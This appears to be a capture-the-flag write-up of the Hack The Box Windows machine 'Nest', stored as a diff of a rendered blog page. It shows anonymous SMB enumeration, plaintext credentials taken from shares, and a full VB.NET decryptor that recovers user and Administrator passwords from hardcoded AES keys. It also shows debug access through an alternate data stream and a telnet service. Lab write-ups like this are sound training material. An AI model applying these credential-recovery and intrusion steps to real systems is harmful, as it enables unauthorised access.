@@ -1,0 +1,363 @@
+I"�R<p><strong><center>Ref°: HTB-07-Boot2Root</center></strong></p>
+
+<p><img src="/assets/images/nest/HTB-Badge-Nest.png" alt="Desktop View" /></p>
+
+<p>— Nest is a Windows machine which highlights the risks of an insecure file system through available and exploitable shares.</p>
+
+<p>Review Code on two programs found in the SMB service, allows to decrypt the hash of a user and the administrator. The hash of the administrator being visible in a legacy service (HQK) using the debug password that was hidden in a file via ADS.</p>
+
+<p><img src="/assets/images/nest/HTB-Information-Nest.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+<p>Nmap scan reveal smb service on her usual port and an other port assigned by a unknow service.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-Pn</span> <span class="nt">-T5</span> 10.10.10.178 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="smb">Smb</h3>
+<hr />
+
+<p>This service reveal many shares visible without authentication : <code class="language-plaintext highlighter-rouge">ADMIN$, C$, Data, IPC$, Secure$, Users</code></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smblcient <span class="nt">-L</span> 10.10.10.178
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-smbanonym.png" alt="Desktop View" /></p>
+
+<h3 id="hqk">HQK</h3>
+<hr />
+
+<p>Telnet connection on port <code class="language-plaintext highlighter-rouge">4386</code>, reveals service named <code class="language-plaintext highlighter-rouge">HQK Reporting Service V1.2</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>telnet 10.10.10.178 4386
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-hqktelnet.png" alt="Desktop View" /></p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>No vulnerabilities identify here, but we have possibility to mount and enum shares in anonymous mode. We can exploit this to access and gain a foothold.</p>
+
+<p>The connection to the HQK service is not protected by authentication. But at this point we don’t have enough information to know how to exploit this path.</p>
+
+<h2 id="2foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="unsecured-file-sharing">Unsecured File Sharing</h3>
+<hr />
+
+<p>We have two shares that give access to the machine and gain foothold : <code class="language-plaintext highlighter-rouge">Data, Users</code>.
+We switch to Windows to access these two shares and we enumerate to perform a lateral movement.</p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-visibleshares.png" alt="Desktop View" /></p>
+
+<h3 id="plaintext-password-from-email">Plaintext Password from email</h3>
+<hr />
+
+<p>We find temporary credentials below <code class="language-plaintext highlighter-rouge">\\10.10.10.178\Data\Shared\Templates\HR\Welcome Email.text</code></p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-welcome.png" alt="Desktop View" /></p>
+
+<h3 id="remote-service-smb-login">Remote Service SMB login</h3>
+<hr />
+
+<p>This temporary user give us more elements from smb service. <code class="language-plaintext highlighter-rouge">smbmap command</code> show us the possibility to access an a other share : <code class="language-plaintext highlighter-rouge">SECURE$</code></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>smbmap <span class="nt">-u</span> TempUser <span class="nt">-p</span> welcome2019 <span class="nt">-H</span> 10.10.10.178
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-smbtemp.png" alt="Desktop View" /></p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="hashed-password-from-xml-file">Hashed Password from .xml file</h3>
+<hr />
+
+<p>We mount this share on our Windows machine with <code class="language-plaintext highlighter-rouge">net use command</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>net use LETTER: <span class="se">\\</span>10.10.10.178<span class="se">\S</span>HARES /user:TempUser welcome2019
+</code></pre></div></div>
+
+<p>We find configuration file with <code class="language-plaintext highlighter-rouge">hash password</code> of user C.Smith below <code class="language-plaintext highlighter-rouge">\\10.10.10.178\Data\IT\Config\RU Scanner\RU_config.xml</code></p>
+
+<p>This file seem to be associated of program named <code class="language-plaintext highlighter-rouge">RU Scanner.</code></p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-ruconfig.png" alt="Desktop View" /></p>
+
+<h3 id="reviewing-code-of-ru-scanner-program">Reviewing Code of RU-Scanner Program</h3>
+<hr />
+<p>NotepadPlusPlus.xml file make reference to a subfolder in SECURE$ share at <code class="language-plaintext highlighter-rouge">line 99</code> : <code class="language-plaintext highlighter-rouge">Carl</code></p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-reffolder.png" alt="Desktop View" /></p>
+
+<p>In this subfolder, we find Visual Studio project named <code class="language-plaintext highlighter-rouge">RUScanner</code> under <code class="language-plaintext highlighter-rouge">\VB Project\WIP\RU\</code>.
+We can find something interesting in this program to potentially decrypt hash ?</p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-ruscanner.png" alt="Desktop View" /></p>
+
+<p>After reviewing the program with Visual Studio, we can find two interesting functions in the <code class="language-plaintext highlighter-rouge">utils.vb</code> object : <code class="language-plaintext highlighter-rouge">EncryptString, DecryptString</code>.</p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-functiondecrypt.png" alt="Desktop View" /></p>
+
+<p>First, let’s look at the encryption function that encrypted the password of the user C.Smith and result the hash found above.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Public Shared Function EncryptString<span class="o">(</span>PlainString As String<span class="o">)</span> As String
+If String.IsNullOrEmpty<span class="o">(</span>PlainString<span class="o">)</span> Then
+        Return String.Empty
+Else
+        Return Encrypt<span class="o">(</span>PlainString, <span class="s2">"N3st22"</span>, <span class="s2">"88552299"</span>, 2, <span class="s2">"464R5DFA5DL6LE28"</span>, 256<span class="o">)</span>
+    End If
+End Function
+</code></pre></div></div>
+
+<p>What we learn here is that to encrypt a string, we use the following :</p>
+
+<ul>
+  <li>passPhrase = <code class="language-plaintext highlighter-rouge">N3st22</code></li>
+  <li>saltValue = <code class="language-plaintext highlighter-rouge">88552299</code></li>
+  <li>passwordIterations = <code class="language-plaintext highlighter-rouge">2</code></li>
+  <li>initVector = <code class="language-plaintext highlighter-rouge">464R5DFA5DL6LE28</code></li>
+  <li>keySize = <code class="language-plaintext highlighter-rouge">256</code></li>
+</ul>
+
+<p>So we have the possiblity to decrypt the hash from function DecryptString.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Public Shared Function DecryptString<span class="o">(</span>EncryptedString As String<span class="o">)</span> As String
+If String.IsNullOrEmpty<span class="o">(</span>EncryptedString<span class="o">)</span> Then
+        Return String.Empty
+Else
+        Return Decrypt<span class="o">(</span>EncryptedString, <span class="s2">"N3st22"</span>, <span class="s2">"88552299"</span>, 2, <span class="s2">"464R5DFA5DL6LE28"</span>, 256<span class="o">)</span>
+    End If
+End Function
+</code></pre></div></div>
+
+<h3 id="decrypting-password">Decrypting Password</h3>
+<hr />
+
+<p>We create a new vb project and insert only the functions we need.</p>
+
+<p>Reference - my vb program : <a href="https://github.com/PCW3R/Tools-Programs/tree/master/Decrypt-Nest-Rfc2898DeriveBytes">https://github.com/PCW3R/Tools-Programs/tree/master/Decrypt-Nest-Rfc2898DeriveBytes</a></p>
+
+<p><strong>Utils.vb :</strong></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Imports System.Text
+Imports System.Security.Cryptography
+Public Class Utils
+
+    Public Shared Function GetLogFilePath<span class="o">()</span> As String
+        Return IO.Path.Combine<span class="o">(</span>Environment.CurrentDirectory, <span class="s2">"Log.txt"</span><span class="o">)</span>
+    End Function
+
+
+    Public Shared Function DecryptString<span class="o">(</span>EncryptedString As String<span class="o">)</span> As String
+        If String.IsNullOrEmpty<span class="o">(</span>EncryptedString<span class="o">)</span> Then
+            Return String.Empty
+        Else
+            Return Decrypt<span class="o">(</span>EncryptedString, <span class="s2">"N3st22"</span>, <span class="s2">"88552299"</span>, 2, <span class="s2">"464R5DFA5DL6LE28"</span>, 256<span class="o">)</span>
+        End If
+    End Function
+
+    Public Shared Function Decrypt<span class="o">(</span>ByVal cipherText As String,
+                                   ByVal passPhrase As String,
+                                   ByVal saltValue As String,
+                                    ByVal passwordIterations As Integer,
+                                   ByVal initVector As String,
+                                   ByVal keySize As Integer<span class="o">)</span> _
+                           As String
+
+        Dim initVectorBytes As Byte<span class="o">()</span>
+        initVectorBytes <span class="o">=</span> Encoding.ASCII.GetBytes<span class="o">(</span>initVector<span class="o">)</span>
+
+        Dim saltValueBytes As Byte<span class="o">()</span>
+        saltValueBytes <span class="o">=</span> Encoding.ASCII.GetBytes<span class="o">(</span>saltValue<span class="o">)</span>
+
+        Dim cipherTextBytes As Byte<span class="o">()</span>
+        cipherTextBytes <span class="o">=</span> Convert.FromBase64String<span class="o">(</span>cipherText<span class="o">)</span>
+
+        Dim password As New Rfc2898DeriveBytes<span class="o">(</span>passPhrase,
+                                           saltValueBytes,
+                                           passwordIterations<span class="o">)</span>
+
+        Dim keyBytes As Byte<span class="o">()</span>
+        keyBytes <span class="o">=</span> password.GetBytes<span class="o">(</span>CInt<span class="o">(</span>keySize / 8<span class="o">))</span>
+
+        Dim symmetricKey As New AesCryptoServiceProvider
+        symmetricKey.Mode <span class="o">=</span> CipherMode.CBC
+
+        Dim decryptor As ICryptoTransform
+        decryptor <span class="o">=</span> symmetricKey.CreateDecryptor<span class="o">(</span>keyBytes, initVectorBytes<span class="o">)</span>
+
+        Dim memoryStream As IO.MemoryStream
+        memoryStream <span class="o">=</span> New IO.MemoryStream<span class="o">(</span>cipherTextBytes<span class="o">)</span>
+
+        Dim cryptoStream As CryptoStream
+        cryptoStream <span class="o">=</span> New CryptoStream<span class="o">(</span>memoryStream,
+                                        decryptor,
+                                        CryptoStreamMode.Read<span class="o">)</span>
+
+        Dim plainTextBytes As Byte<span class="o">()</span>
+        ReDim plainTextBytes<span class="o">(</span>cipherTextBytes.Length<span class="o">)</span>
+
+        Dim decryptedByteCount As Integer
+        decryptedByteCount <span class="o">=</span> cryptoStream.Read<span class="o">(</span>plainTextBytes,
+                                               0,
+                                               plainTextBytes.Length<span class="o">)</span>
+
+        memoryStream.Close<span class="o">()</span>
+        cryptoStream.Close<span class="o">()</span>
+
+        Dim plainText As String
+        plainText <span class="o">=</span> Encoding.ASCII.GetString<span class="o">(</span>plainTextBytes,
+                                            0,
+                                            decryptedByteCount<span class="o">)</span>
+
+        Return plainText
+    End Function
+
+End Class
+</code></pre></div></div>
+
+<p><strong>Program.vb :</strong> We pass the hash value like EncryptedString and call the function DecryptString to result in console the password in plaintext of the user C.Smith.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Imports System
+
+Module Program
+  Sub Main<span class="o">(</span>args As String<span class="o">())</span>
+        Console.WriteLine<span class="o">(</span>Utils.DecryptString<span class="o">(</span>EncryptedString:<span class="o">=</span><span class="s2">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="o">))</span>
+  End Sub
+End Module
+</code></pre></div></div>
+
+<p>The password is decrypted : <strong>xRxRxPANCAK3SxRxRx</strong></p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-decryptresult1.png" alt="Desktop View" /></p>
+
+<h3 id="flag-user">Flag user</h3>
+<hr />
+
+<p>And we flag the user.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>net use LETTER: <span class="se">\\</span>10.10.10.178<span class="se">\U</span>SERS /user:C.Smith xRxRxPANCAK3SxRxRx
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-flaguser.png" alt="Desktop View" /></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="enumeration-under-csmith-account">Enumeration under C.Smith account</h3>
+<hr />
+<p>We enum under C.Smith account on SMB service and find several things :</p>
+
+<ul>
+  <li>Program <code class="language-plaintext highlighter-rouge">HqkLdap.exe</code> can be find under <code class="language-plaintext highlighter-rouge">\\10.10.10.178\USERS\C.Smith\HQK Reporting\AD Integration Module\</code></li>
+</ul>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-hqkldap.png" alt="Desktop View" /></p>
+
+<ul>
+  <li>A <code class="language-plaintext highlighter-rouge">configuration file</code> of the service HQK can be find under <code class="language-plaintext highlighter-rouge">\\10.10.10.178\USERS\C.Smith\HQK Reporting\HQK_Config_Backup.xml</code> with a reference to <code class="language-plaintext highlighter-rouge">port 4386</code></li>
+</ul>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-port.png" alt="Desktop View" /></p>
+
+<ul>
+  <li>And <code class="language-plaintext highlighter-rouge">empty file</code> can be find under <code class="language-plaintext highlighter-rouge">\\10.10.10.178\USERS\C.Smith\HQK Reporting\Debug Mode Password.txt</code> with reference to <code class="language-plaintext highlighter-rouge">DEBUG Password</code> of the service HQK</li>
+</ul>
+
+<h3 id="debug-mode-password">Debug Mode Password</h3>
+<hr />
+<p>The HQK service is accessible without authentication but it is useless in this context. To go further and find other interesting elements to raise our privileges, we need to find the Debug Mode Password of the service.</p>
+
+<p>The file <code class="language-plaintext highlighter-rouge">Debug Mode Password.txt</code> seem to be empty on the face of it. But in reality the file hide data through <code class="language-plaintext highlighter-rouge">ADS</code>.</p>
+
+<p>Reference - ADS tool : <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/streams">https://docs.microsoft.com/en-us/sysinternals/downloads/streams</a></p>
+
+<p>ADS or Alternate Data Stream is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file.</p>
+
+<p>ADS have been given a bad reputation because their capability to hide data from us on our own computer, has been abused by malware writers in the past. Here we use ADS to hide the debug password : <strong>WBQ201953D8w</strong></p>
+
+<p>Reference - ADS method : <a href="https://www.asafety.fr/administration-reseaux-et-systemes/les-ads-de-windows-pour-camoufler-vos-fichiers-dans-des-fichiers/">https://www.asafety.fr/administration-reseaux-et-systemes/les-ads-de-windows-pour-camoufler-vos-fichiers-dans-des-fichiers/</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir /R
+Debug Mode Password.txt:Password:$DATA
+
+more &lt; "Debug Mode Password.txt":Password
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-ads.png" alt="Desktop View" /></p>
+
+<h3 id="hashed-password-through-hqk">Hashed Password through HQK</h3>
+<hr />
+<p>We use the Debug Password and find the hash password of the Administrator in <code class="language-plaintext highlighter-rouge">Ldap.conf</code>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>telnet 10.10.10.178 4386
+<span class="gp">&gt;</span><span class="w"> </span>DEBUG WBQ201953D8w
+<span class="gp">&gt;</span><span class="w"> </span>SETDIR ..
+<span class="gp">&gt;</span><span class="w"> </span>SETDIR ldap
+<span class="gp">&gt;</span><span class="w"> </span>SHOWQUERY 2
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-hqk.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-hqk2.png" alt="Desktop View" /></p>
+
+<p>We have the hash and we’re going to proceed in the same way to decrypt it. But we need to know the good values of <code class="language-plaintext highlighter-rouge">passPhrase / saltvalue / passwordIterations / initVector and keySize</code>.</p>
+
+<h3 id="reviewing-code-hqkldapexe">Reviewing Code HqkLdap.exe</h3>
+<hr />
+<p>We decompile the program HqkLdap.exe with <code class="language-plaintext highlighter-rouge">ILSpy tool</code> and find the correct values.</p>
+
+<p>Reference - ILSpy tool : <a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a></p>
+
+<ul>
+  <li>passPhrase = <code class="language-plaintext highlighter-rouge">667912</code></li>
+  <li>saltValue = <code class="language-plaintext highlighter-rouge">1313Rf99</code></li>
+  <li>passwordIterations = <code class="language-plaintext highlighter-rouge">3</code></li>
+  <li>initVector = <code class="language-plaintext highlighter-rouge">1L1SA61493DRV53Z</code></li>
+  <li>keySize = <code class="language-plaintext highlighter-rouge">256</code></li>
+</ul>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-decompil.png" alt="Desktop View" /></p>
+
+<h3 id="decrypting-password-1">Decrypting Password</h3>
+<hr />
+
+<p>We replace this values in our program :</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Else
+Return Decrypt(EncryptedString, "passPhrase", "saltValue", "passwordIterations", "initvector", "keySize")
+End If
+</code></pre></div></div>
+
+<p>And pass the hash value to decrypt the password : <strong>XtH4nkS4Pl4y1nGX</strong></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Imports System
+
+Module Program
+  Sub Main<span class="o">(</span>args As String<span class="o">())</span>
+        Console.WriteLine<span class="o">(</span>Utils.DecryptString<span class="o">(</span>EncryptedString:<span class="o">=</span><span class="s2">"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="</span><span class="o">))</span>
+  End Sub
+End Module
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-decryptresult2.png" alt="Desktop View" /></p>
+
+<p>We get full control of Nest machine.</p>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>net use LETTER: <span class="se">\\</span>10.10.10.178<span class="se">\C</span><span class="nv">$ </span>/user:Administrator XtH4nkS4Pl4y1nGX
+</code></pre></div></div>
+
+<p><img src="/assets/images/nest/HTB-Images-Nest-flagroot.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>Look up at the stars and not down at your feet.</strong></p>
+
+  <p>Stephen Hawking</p>
+</blockquote>
+:ET
